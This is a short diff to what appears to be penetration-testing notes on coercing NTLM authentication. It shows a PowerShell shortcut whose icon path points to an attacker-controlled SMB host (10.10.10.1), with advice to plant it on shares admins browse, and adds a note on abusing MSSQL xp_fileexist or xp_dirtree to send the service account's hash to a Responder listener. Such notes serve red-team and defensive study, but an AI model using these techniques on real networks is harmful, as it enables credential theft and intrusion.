@@ -48,3 +48,6 @@ $shortcut.IconLocation = "\\10.10.10.1\test.ico"
 $shortcut.Save()
 ```
 A good location for such a file would be a central SMB share where many people have read access. (Or a share where the IT admins are regularly connecting to...)
+
+## MSSQL
+If you happen to find an MSSQL instance where you have access (using PowerUpSQL) and you can run either 'xp_fileexist' or 'xp_dirtree', you can try to use those to trigger an authenticated ntlm connection from the SQL service account to e.g. your responder instance.
